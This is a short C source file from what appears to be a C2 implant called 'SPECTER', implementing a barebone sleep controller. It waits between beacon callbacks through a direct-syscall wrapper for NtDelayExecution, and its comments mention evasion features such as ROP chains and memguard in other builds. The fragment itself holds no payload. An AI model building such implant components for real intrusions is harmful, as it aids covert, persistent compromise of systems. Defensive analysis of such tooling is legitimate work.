/**
 * SPECTER Implant - Barebone Sleep Controller
 *
 * Minimal delay-only sleep used by SPECTER_BAREBONE builds. It keeps the
 * callback cadence without pulling in timer queues, ROP chains, or memguard.
 */

#include "specter.h"
#include "ntdefs.h"
#include "config.h"
#include "syscalls.h"

NTSTATUS sleep_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    ctx->sleep_ctx = ctx;
    return STATUS_SUCCESS;
}

NTSTATUS sleep_cycle(IMPLANT_CONTEXT *ctx) {
    DWORD sleep_ms = 5000;
    if (ctx) {
        IMPLANT_CONFIG *cfg = cfg_get(ctx);
        if (cfg && cfg->sleep_interval > 0)
            sleep_ms = cfg->sleep_interval;
    }

    LARGE_INTEGER delay;
    delay.QuadPart = -((long long)sleep_ms * 10000LL);
    return spec_NtDelayExecution(FALSE, &delay);
}
